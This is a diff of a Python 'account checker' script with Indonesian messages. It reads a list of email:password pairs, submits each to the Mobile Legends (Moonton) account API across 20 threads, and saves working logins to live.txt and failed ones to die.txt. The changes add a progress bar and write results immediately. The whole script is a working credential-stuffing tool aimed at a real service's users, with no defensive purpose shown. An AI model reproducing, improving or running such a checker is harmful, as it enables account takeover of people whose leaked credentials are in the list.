@@ -3,38 +3,26 @@ import os
 import sys
 import hashlib
 import json
-import time
 from multiprocessing.pool import ThreadPool
+from alive_progress import alive_bar
 
 if sys.version_info.major != 3:
-    exit('\033[91m[WARNING] Gunakan python versi 3\033[0m')
+    exit('\n[WARNING] Gunakan python versi 3')
 
 class MOONTON:
     def __init__(self):
         self.userdata = []
-        self.live = [] # Menyimpan akun yang berhasil
-        self.die = []  # Menyimpan akun yang gagal
+        self.live = []
+        self.die = []
         self.api = 'https://accountmtapi.mobilelegends.com/'
-        self.loading_symbols = ['\\', '|', '/', '-']
-        self.loading_index = 0
+        print('''\033[92m
 
-    def loading_animation(self):
-        sys.stdout.write('\r\033[92m[+] Memeriksa akun\033[0m ' + self.loading_symbols[self.loading_index % 4])
-        sys.stdout.flush()
-        self.loading_index += 1
-        time.sleep(0.1)
-
-    def progress_bar(self, current, total, bar_length=40):
-        progress = int(current / total * bar_length)
-        bar = '=' * progress + '-' * (bar_length - progress)
-        sys.stdout.write('\r\033[94;3m[+] Progress: [{0}] {1}/{2} ({3:.2f}%)\033[0m'.format(bar, current, total, current / total * 100))
-        sys.stdout.flush()
+\n''')
 
     def main(self):
-        print('[\033[92m!] Pemisah email:password atau email|password\033[0m\n')
+        print('[!] Pemisah email:password atau email|password\n')
         empas = input('[?] List empas (ex: list.txt): ')
         if os.path.exists(empas):
-            total_accounts = sum(1 for line in open(empas))
             for data in open(empas, 'r').readlines():
                 try:
                     user = data.strip().split('|')
@@ -56,17 +44,17 @@ class MOONTON:
                     except:
                         pass
             if len(self.userdata) == 0:
-                exit('\033[91m[!] Empas tidak ada atau tidak valid pastikan berformat email:pass atau email|pass\033[0m')
+                exit('[!] Empas tidak ada atau tidak valid pastikan berformat email:pass atau email|pass')
             print('[*] Total {0} Account\n'.format(str(len(self.userdata))))
 
-            # Menjalankan thread untuk memeriksa akun
-            self.validate_accounts()
+            with alive_bar(len(self.userdata)) as bar:
+                ThreadPool(20).map(lambda user: self.validate(user, bar), self.userdata)
 
-            # Menyimpan histori ke file
-            self.save_history()
-
+            print('\n[#] BERHASIL: '+str(len(self.live))+' - saved: live.txt')
+            print('[#] GAGAL: '+str(len(self.die))+' - saved: die.txt')
+            exit(0)
         else:
-            print('\033[91m[!] File tidak ditemukan "{0}"\033[0m'.format(empas))
+            print('[!] File tidak ditemukan "{0}"'.format(empas))
 
     def build_params(self, user):
         md5 = hashlib.new('md5')
@@ -86,41 +74,21 @@ class MOONTON:
             'lang': 'cn'
         })
 
-    def validate(self, user):
+    def validate(self, user, bar):
         try:
             data = self.build_params(user)
             response = requests.post(self.api, data=data).json()
             if response['message'] == 'Error_Success':
                 print('[\033[92mBERHASIL\033[0m] '+user['userdata'])
                 self.live.append(user['userdata'])
+                open('live.txt','a').write(str(user['userdata'])+'\n')
             else:
                 print('[\033[91mGAGAL\033[0m] '+user['userdata'])
                 self.die.append(user['userdata'])
+                open('die.txt','a').write(str(user['userdata'])+'\n')
         except:
-            self.validate(user)
-
-    def validate_accounts(self):
-        print('[+] Memeriksa akun...\n')
-        for _ in range(3):
-            for i, user in enumerate(self.userdata, 1):
-                self.loading_animation()
-                self.progress_bar(i, len(self.userdata))
-                self.validate(user)
-        print('\n[+] Proses selesai.\n')
-
-    def save_history(self):
-        print('[+] Menyimpan histori...\n')
-        if len(self.live) > 0:
-            with open('live.txt', 'w') as f:
-                for data in self.live:
-                    f.write(data + '\n')
-            print('[+] BERHASIL: {0} - saved: live.txt'.format(str(len(self.live))))
-        if len(self.die) > 0:
-            with open('die.txt', 'w') as f:
-                for data in self.die:
-                    f.write(data + '\n')
-            print('[+] GAGAL: {0} - saved: die.txt'.format(str(len(self.die))))
+            self.validate(user, bar)
+        bar()
 
 if __name__ == '__main__':
     MOONTON().main()
-        
